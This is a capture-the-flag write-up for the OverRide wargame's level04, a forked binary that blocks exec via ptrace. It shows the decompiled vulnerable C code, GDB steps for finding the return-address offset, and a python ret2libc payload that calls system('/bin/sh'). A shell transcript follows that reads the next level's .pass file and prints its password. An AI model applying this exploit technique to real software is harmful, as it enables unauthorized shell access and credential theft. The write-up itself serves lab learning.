## level04 (ptracing / shellcode injection with limited function calls)
```clike!
int main()
{
    char child_input[136]; // 168 - 32
    int pid;
    inr wait_status;
    int ptrace_res;
    
    pid = fork();
    memset(child_input, 0, 32);
    ptrace_res = 0;
    wait_status = 0;
    if (pid == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(child_input);
        return 0;
    }
    else
    {
        wait(&wait_status);
        if (WIFEXITED(wait_status) || WIFSIGNALED(wait_status))
        {
            puts("child is exiting");
            return 0;
        }
        if (ptrace(PTRACE_PEEKUSER, pid, 44, NULL) == 11)
        {
            puts("no exec() for you");
            kill(pid, 9);
            return 0;
        }
    }
}
```

On the surface, this looks like a buffer overflow vulnerability with a `gets()` call on a limited size buffer. The catch is, we are unable to call `exec()` in the child for the buffer overflow. Which means we have to use other functions like `system()`

First off, I located the EIP offset with the help of **[Buffer Overflow EIP Offset String generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)** To generate the string pattern and matching.

By setting **`set follow-fork-mode child`** in GDB, im able to trace through the fork and obtain the offset as `156`. Since we are using other functions, we have to find the addresses loaded in memory. which is the pointer to the `system()` function and the string `/bin/sh`. This can be acheived using `print system` and `find __libc_start_main,+99999999,"/bin/sh"` (find from libc main for 99999999 bytes "/bin/sh").

Our pointer to `system()` is `0xf7e6aed0`, our pointer to "/bin/sh" is `0xf7f897ec`.
![image](https://hackmd.io/_uploads/rJfxRy2Up.png)

Hence, we can generate our shellcode like so
```
python -c "print 'B' * 156 + '\xf7\xe6\xae\xd0'[::-1] + 'BEEF' + '\xf7\xf8\x97\xec'[::-1]" > /tmp/level04

 (cat /tmp/level04 ; cat) | ./level04
```

And we have our password `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
```
level04@OverRide:~$  (cat /tmp/level04 ; cat) | ./level04
Give me some shellcode, k
pwd
/home/users/level04
whoami
level05
cat /home/users/level05
cat: /home/users/level05: Is a directory
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
